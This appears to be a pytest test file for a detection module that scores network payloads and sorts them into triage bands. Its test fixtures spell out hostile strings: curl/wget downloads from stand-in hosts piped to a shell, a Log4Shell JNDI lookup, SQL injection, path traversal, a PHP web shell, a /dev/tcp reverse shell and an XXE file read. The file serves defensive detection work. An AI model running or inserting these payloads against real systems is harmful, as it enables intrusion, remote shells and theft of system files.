"""Payload scoring behaviour."""

from __future__ import annotations

import pytest

from deception_shield.models import TriageBand
from deception_shield.scoring import MAX_SCORE, SIGNATURES, score_payload


class TestSignatureMatching:
    @pytest.mark.parametrize(
        ("payload", "expected"),
        [
            (b"curl http://evil.tld/a.sh | sh", "remote_payload_fetch"),
            (b"wget http://1.2.3.4/x | bash", "shell_pipe_execution"),
            (b"${jndi:ldap://attacker.tld/a}", "log4shell"),
            (b"' OR '1'='1", "sql_injection"),
            (b"GET /../../../../etc/passwd", "path_traversal"),
            (b"<?php eval($_POST['c']); ?>", "webshell_upload"),
            (b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse_shell"),
            (b"<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", "xxe_attempt"),
            (b"busybox wget http://1.1.1.1/bins", "iot_botnet_dropper"),
            (b"Mozilla/5.0 zgrab/0.x", "scanner_fingerprint"),
        ],
    )
    def test_known_shapes_are_detected(self, payload: bytes, expected: str) -> None:
        assert expected in score_payload(payload).signatures

    def test_benign_traffic_scores_zero(self) -> None:
        result = score_payload(b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n")
        assert result.score == 0
        assert result.triage is TriageBand.BENIGN
        assert result.signatures == []

    def test_percent_encoding_is_decoded_before_matching(self) -> None:
        """An encoded traversal must match the same rule as a plain one."""
        assert "path_traversal" in score_payload(b"GET /%2e%2e%2f%2e%2e%2fetc/passwd").signatures

    def test_multiple_signatures_accumulate(self) -> None:
        result = score_payload(b"wget http://evil/m.sh | sh; cat /etc/passwd")
        assert len(result.signatures) >= 2
        assert result.score > 40

    def test_score_is_capped(self) -> None:
        """Stacking every rule must not produce a score above the ceiling."""
        payload = b" ".join(
            [
                b"wget http://a/b | sh",
                b"${jndi:ldap://x/y}",
                b"' OR '1'='1 union select",
                b"../../../../etc/passwd",
                b"<?php eval($_POST[x]);",
                b"/dev/tcp/1.1.1.1/4444",
                b"busybox wget http://z/m",
            ]
        )
        assert score_payload(payload).score == MAX_SCORE


class TestTriageBands:
    @pytest.mark.parametrize(
        ("score", "band"),
        [
            (0, TriageBand.BENIGN),
            (10, TriageBand.NOISE),
            (19, TriageBand.NOISE),
            (20, TriageBand.SUSPICIOUS),
            (49, TriageBand.SUSPICIOUS),
            (50, TriageBand.LIKELY_MALICIOUS),
            (79, TriageBand.LIKELY_MALICIOUS),
            (80, TriageBand.CRITICAL),
            (100, TriageBand.CRITICAL),
        ],
    )
    def test_band_boundaries(self, score: int, band: TriageBand) -> None:
        assert TriageBand.from_score(score) is band

    def test_bands_are_ordered(self) -> None:
        assert TriageBand.BENIGN < TriageBand.NOISE < TriageBand.SUSPICIOUS
        assert TriageBand.CRITICAL > TriageBand.LIKELY_MALICIOUS


class TestEdgeCases:
    def test_empty_payload(self) -> None:
        result = score_payload(b"")
        assert result.score == 0
        assert result.triage is TriageBand.BENIGN

    def test_binary_payload_is_surfaced_for_inspection(self) -> None:
        """Shellcode matches no text rule but must not be filed as benign."""
        result = score_payload(bytes(range(0, 64)))
        assert result.signatures == ["non_printable_payload"]
        assert result.triage is TriageBand.SUSPICIOUS

    def test_invalid_utf8_does_not_raise(self) -> None:
        assert score_payload(b"\xff\xfe\xfd wget http://x/y | sh").score > 0

    def test_string_input_is_accepted(self) -> None:
        assert score_payload("${jndi:ldap://x/y}").score > 0

    def test_printable_ratio_override_is_respected(self) -> None:
        """A caller supplying the ratio must not have it recomputed."""
        result = score_payload(b"\x00\x01", printable_ratio=1.0)
        assert result.signatures == []


def test_signature_table_is_well_formed() -> None:
    names = [s.name for s in SIGNATURES]
    assert len(names) == len(set(names)), "signature names must be unique"
    assert all(0 < s.weight <= 50 for s in SIGNATURES)
    assert all(s.technique for s in SIGNATURES)
